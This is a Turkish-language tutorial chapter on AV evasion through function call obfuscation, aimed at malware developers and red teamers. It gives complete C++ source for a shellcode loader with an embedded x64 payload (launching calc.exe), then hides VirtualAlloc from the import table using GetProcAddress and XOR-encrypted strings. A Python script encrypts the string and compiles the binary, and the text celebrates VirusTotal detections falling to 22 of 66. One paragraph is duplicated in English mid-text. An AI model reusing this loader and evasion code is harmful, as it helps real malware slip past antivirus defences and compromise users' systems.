\newpage
\subsection{55. AV motorlarından kaçma için C++ basit zararlı yazılım - 2. bölüm}

﷽

![AV evasion 2](./images/3/2021-09-16_10-57.png){width="80%"}    

Bu, öğreticinin ikinci kısmıdır,okumadan önce [önceki](https://cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html) kısmı incelemenizi tavsiye ederim.    

Bu bölümde fonksiyon çağrısı gizleme tekniğini inceleyeceğiz. Peki bu nedir? Neden zararlı yazılım geliştiricileri ve kırmızı takım üyeleri bunu öğrenmelidir?      

Hadi, birinci bölümdeki `evil.exe` dosyamızı virustotal'da inceleyelim:          

[https://www.virustotal.com/gui/file/c7393080957780bb88f7ab1fa2d19bdd1d99e9808efbfaf7989e1e15fd9587ca/detection](https://www.virustotal.com/gui/file/c7393080957780bb88f7ab1fa2d19bdd1d99e9808efbfaf7989e1e15fd9587ca/detection)

ve "details" sekmesine gidin:   

![details](./images/3/2021-09-06_16-02.png){width="80%"}    

Her PE modülü, `.exe` ve `.dll` gibi, genellikle dış fonksiyonlar kullanır. Yani çalıştığında, dış DLL'lerde uygulanan her fonksiyonu çağıracak ve bu fonksiyonlar, işlem belleğine haritalanarak süreç kodunun erişimine sunulacaktır.     

AV endüstrisi, zararlı yazılımlar tarafından kullanılan çoğu dış DLL'yi ve fonksiyonu analiz eder. Bu, dosyanın kötü amaçlı olup olmadığını belirlemede iyi bir gösterge olabilir. Bu nedenle AV motoru, bir PE dosyasını disk üzerinde analiz ederken, içindeki dışa aktarılan adreslere bakar.

Elbette bu yöntem kusursuz değildir ve bazı yanlış pozitifler oluşturabilir, ancak bazı durumlarda işe yaradığını biliniyor ve AV motorları tarafından yaygın olarak kullanılmaktadır.     

Peki, biz zararlı yazılım geliştiricileri bu durumda ne yapabiliriz? İşte fonksiyon çağrısı gizlemenin devreye girdiği yer burasıdır. **Function Call Obfuscation**, DLL'lerinizi ve çalışma zamanı sırasında çağrılacak dış fonksiyonları gizleme yöntemidir. Bunu yapmak için, `GetModuleHandle` ve `GetProcAddress` adlı standart Windows API fonksiyonlarını kullanabiliriz. İlki, belirtilen bir DLL'yi işaret eder ve ikincisi, o DLL'den dışa aktarılan ve ihtiyaç duyulan fonksiyonun bellek adresini almanıza olanak tanır.     

Şimdi bir örnek vereyim. Diyelim ki programınızın `hacker.dll` adlı bir DLL'de dışa aktarılan `HackAndWin` fonksiyonunu çağırması gerekiyor. İlk olarak `GetModuleHandle`'i çağırırsınız ve ardından `GetProcAddress`'i `HackAndWin` fonksiyonu ile argüman olarak çağırırsınız ve karşılığında o fonksiyonun adresini alırsınız:      

```cpp
hack = GetProcAddress(
GetModuleHandle("hacker.dll"), "HackAndWin");
```

Yani burada önemli olan nedir? Şudur ki, kodunuzu derlerseniz, derleyici `hacker.dll`'yi içeri aktarma adres tablosuna dahil etmeyecektir. Böylece AV motoru, statik analiz sırasında bunu göremeyecektir.      

Bu tekniği pratikte nasıl kullanabileceğimize bakalım. İlk bölümdeki [ilk](https//cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html) zararlı yazılımımızın kaynak koduna göz atalım:    

```cpp
/*
cpp implementation malware 
example with calc.exe payload
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// our payload calc.exe
unsigned char my_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 
  0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 
  0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 
  0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 
  0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 
  0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
  0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 
  0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 
  0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 
  0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 
  0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 
  0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 
  0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 
  0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 
  0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 
  0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 
  0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 
  0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 
  0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 
  0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 
  0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 
  0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
unsigned int my_payload_len = sizeof(my_payload);

int main(void) {
  void * my_payload_mem; // memory buffer for payload
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  // Allocate a memory buffer for payload
  my_payload_mem = VirtualAlloc(0, my_payload_len, 
  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // copy payload to buffer
  RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);

  // make new buffer as executable
  rv = VirtualProtect(my_payload_mem, my_payload_len, 
  PAGE_EXECUTE_READ, &oldprotect);
  if ( rv != 0 ) {

    // run payload
    th = CreateThread(0, 0, 
    (LPTHREAD_START_ROUTINE) my_payload_mem, 
    0, 0, 0);
    WaitForSingleObject(th, -1);
  }
  return 0;
}
```

Bu kod, payload’u çalıştırma için çok temel bir mantık içeriyor. Bu durumda, basitlik adına, şifrelenmiş bir payload değil, düz bir payload kullanılmıştır.    

![payload](./images/3/2021-09-06_16-31.png){width="80%"}    

Haydi, derleyelim:    

![compile](./images/3/2021-09-06_16-45.png){width="80%"}    

doğru çalıştığına emin olmak için kodu çalıştırlım:      

![run](./images/3/2021-09-06_16-44.png){width="80%"}    

Hadi, import adres tablosuna bir göz atalım.     

```bash
objdump -x -D evil.exe | less
```

![objdump address table](./images/3/2021-09-06_16-49.png){width="80%"}    

Ve gördüğünüz gibi, programımız `KERNEL32.dll`'yi kullanıyor ve bu fonksiyonların tamamını içe aktarıyor:    

![imported functions kernel32.dll](./images/3/2021-09-06_16-51.png){width="80%"}    

Ve bunların bazıları kodumuzda kullanılıyor:    

![imported functions kernel32.dll](./images/3/2021-09-06_16-57.png){width="80%"}    

Şimdi `VirtualAlloc`'dan kurtulalım. Peki bunu nasıl yapabiliriz?     
İlk olarak `VirtualAlloc`'un bir deklarasyonunu bulmamız gerekiyor:     

![virtualalloc declaration](./images/3/2021-09-06_17-01.png){width="80%"}    

Ve sadece bunun `kernel32.dll`'de uygulandığından emin olalım:     

![virtualalloc declaration](./images/3/2021-09-06_17-04.png){width="80%"}    

Şimdi, `VirtualAlloc` adında bir global değişken oluşturalım, ancak bu bir işaretçi olmalı, `pVirtualAlloc`. Bu değişken, `VirtualAlloc`'un adresini saklayacak:    

![pvirtualalloc](./images/3/2021-09-06_17-18.png){width="80%"}    

Ve şimdi bu adresi `GetProcAddress` ile almalıyız, ve `VirtualAlloc` çağrısını `pVirtualAlloc` ile değiştirmeliyiz:    

![pvirtualalloc in code](./images/3/2021-09-06_17-25.png){width="80%"}    

Sonra bunu derleyelim. Ve tekrar import address table'ına bakalım:     

```bash
objdump -x -D evil.exe | less
```

![pvirtualalloc import address table](./images/3/2021-09-06_17-27.png){width="80%"}    

Bu yüzden import address table'ında `VirtualAlloc` yok.    

Görünüşe göre her şey iyi. Ancak bir uyarı var. Binaries'imizden tüm string'leri çıkarmaya çalıştığımızda, `VirtualAlloc` string'inin hâlâ orada olduğunu göreceğiz. Bunu yapalım. Şu komutu çalıştırın:     

So no `VirtualAlloc` in import address table.
Looks good. But, there is a caveat. When we try to extract all the strings from the our binary we will see that `VirtualAlloc` string is still there. Let's do it.
run:   

```bash
strings -n 8 evil.exe
```

![strings evil](./images/3/2021-09-06_17-30.png){width="80%"}    

Gördüğünüz gibi burada. Sebebi, `GetProcAddress` çağırırken stream'i açık metin olarak kullanmamızdır.     

Peki, bununla ilgili ne yapabiliriz?     
Çözüm, bunu kaldırmaktır. Daha önce kullandığımız XOR fonksiyonunu şifreleme/şifre çözme için kullanabiliriz, o zaman bunu yapalım.    
İlk olarak, XOR fonksiyonunu `evil.cpp` malware kaynak kodumuza ekleyelim:   

![add XOR](./images/3/2021-09-06_17-35.png){width="80%"}    

Bunun için şifreleme anahtarına ve bazı dizelere ihtiyacımız olacak. Ve diyelim ki dizemiz `cVirtualAlloc` olacak, o zaman kodumuzu şu şekilde değiştirelim:    

![add key](./images/3/2021-09-07_01-09.png){width="80%"}    

XOR şifre çözme fonksiyonunu ekleyelim:     

![deXOR](./images/3/2021-09-06_17-52.png){width="80%"}    

Bizim zararlı yazımızın son hali şu şekildedir:     

```cpp
/*
cpp implementation malware 
example with calc.exe payload
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// our payload calc.exe
unsigned char my_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 
  0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 
  0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 
  0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 
  0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 
  0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
  0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 
  0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 
  0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 
  0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 
  0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 
  0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 
  0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 
  0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 
  0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 
  0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 
  0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 
  0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 
  0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 
  0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 
  0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 
  0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
unsigned int my_payload_len = sizeof(my_payload);

// XOR encrypted VirtualAlloc
unsigned char cVirtualAlloc[] = { };
unsigned int cVirtualAllocLen = sizeof(cVirtualAlloc);

// encrypt/decrypt key
char mySecretKey[] = "meowmeow";

// LPVOID VirtualAlloc(
//   LPVOID lpAddress,
//   SIZE_T dwSize,
//   DWORD  flAllocationType,
//   DWORD  flProtect
// );

LPVOID (WINAPI * pVirtualAlloc)(
    LPVOID lpAddress, 
    SIZE_T dwSize, 
    DWORD flAllocationType, 
    DWORD flProtect
);

void XOR(char * data, size_t data_len, char * key, 
size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
    data[i] = data[i] ^ key[j];
    j++;
  }
}

int main(void) {
  void * my_payload_mem; // memory buffer for payload
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  XOR((char *) cVirtualAlloc, cVirtualAllocLen, 
  mySecretKey, sizeof(mySecretKey));

  // Allocate a memory buffer for payload
  pVirtualAlloc = GetProcAddress(
  GetModuleHandle("kernel32.dll"), cVirtualAlloc);

  my_payload_mem = pVirtualAlloc(0, my_payload_len, 
  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // copy payload to buffer
  RtlMoveMemory(my_payload_mem, my_payload, 
  my_payload_len);

  // make new buffer as executable
  rv = VirtualProtect(my_payload_mem, my_payload_len, 
  PAGE_EXECUTE_READ, &oldprotect);
  if ( rv != 0 ) {

    // run payload
    th = CreateThread(0, 0, 
    (LPTHREAD_START_ROUTINE) my_payload_mem, 
    0, 0, 0);
	WaitForSingleObject(th, -1);
  }
  return 0;
}

```

Ve fonksiyon adımızı XOR ile şifrelemek ve yerine koymak için Python scripti kullanın:    

```python
import sys
import os
import hashlib
import string

## XOR function to encrypt data
def xor(data, key):
    key = str(key)
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        ordd = lambda x: x if isinstance(x, int) else ord(x)
        output_str += chr(ordd(current) ^ ord(current_key))
    return output_str

## encrypting
def xor_encrypt(data, key):
    ciphertext = xor(data, key)
    ciphertext = '{ 0x' + ', 0x'.
    join(hex(ord(x))[2:] for x in ciphertext) + ' };'
    print (ciphertext)
    return ciphertext, key

## key for encrypt/decrypt
plaintext = "VirtualAlloc"
my_secret_key = "meowmeow"

## encrypt VirtualAlloc
ciphertext, p_key = xor_encrypt(plaintext, my_secret_key)

## open and replace our payload in C++ code
tmp = open("evil.cpp", "rt")
data = tmp.read()
data = data.replace('unsigned char cVirtualAlloc[] = { };', 
'unsigned char cVirtualAlloc[] = ' + ciphertext)
tmp.close()
tmp = open("evil-enc.cpp", "w+")
tmp.write(data)
tmp.close()

## compile
try:
    cmd = "x86_64-w64-mingw32-gcc evil-enc.cpp"
    cmd += " -o evil.exe -s -ffunction-sections"
    cmd += " -fdata-sections -Wno-write-strings"
    cmd += " -fno-exceptions -fmerge-all-constants"
    cmd += " -static-libstdc++ -static-libgcc"
    cmd += " >/dev/null 2>&1"
    os.system(cmd)
except:
    print ("error compiling malware template :(")
    sys.exit()
else:
    print (cmd)
    print ("successfully compiled :)")
```

Derleyelim ve control edelim:    

```bash
strings -n 8 evil.exe | grep "Virtual"
```

![strings virtual](./images/3/2021-09-06_18-49.png){width="80%"}    

Ve gördüğünüz gibi, artık strings kontrolünde `VirtualAlloc` yok. İşte aslında kodunuzdaki herhangi bir fonksiyonu nasıl obfuscate edebileceğiniz. Bu `VirtualProtect` veya `RtlMoveMemory` gibi fonksiyonlar olabilir.    

Çalıştıralım:    

![calc](./images/3/2021-09-07_00-54.png){width="80%"}    

her şey doğru.    

Haydi `evil.exe`'mizi virustotal'a yükleyelim:     

![virustotal](./images/3/2021-09-07_01-01.png){width="80%"}    

[https://www.virustotal.com/gui/file/bf21d0af617f1bad81ea178963d70602340d85145b96aba330018259bd02fe56/detection](https://www.virustotal.com/gui/file/bf21d0af617f1bad81ea178963d70602340d85145b96aba330018259bd02fe56/detection)

**Yani, 66 antivirüs motorunun 22'si dosyamızı kötü amaçlı olarak tespit ediyor**

Diğer fonksiyonlar da obfuscate edilerek antivirüs motorlarının dosyamızı tespit etme sayısını azaltabiliriz.     
Daha iyi sonuçlar için payload şifrelemesi, rastgele anahtarlarla ve fonksiyonları başka anahtarlarla obfuscate etmek gibi yöntemler birleştirilebilir.    

[Github'taki kaynak kod](https://github.com/cocomelonc/2021-09-06-av-evasion-2)

- [VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)    
- [RtlMoveMemory](https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory)    
- [VirtualProtect](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)    
- [WaitForSingleObject](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)    
- [CreateThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)    
- [XOR](https://en.wikipedia.org/wiki/XOR_cipher)    

Araştırmamın bir sonucu olarak, [peekaboo](https://github.com/cocomelonc/peekaboo) adlı projem ortaya çıktı. Basit, tespit edilemeyen shellcode ve kod enjeksiyon başlatıcı örneği.     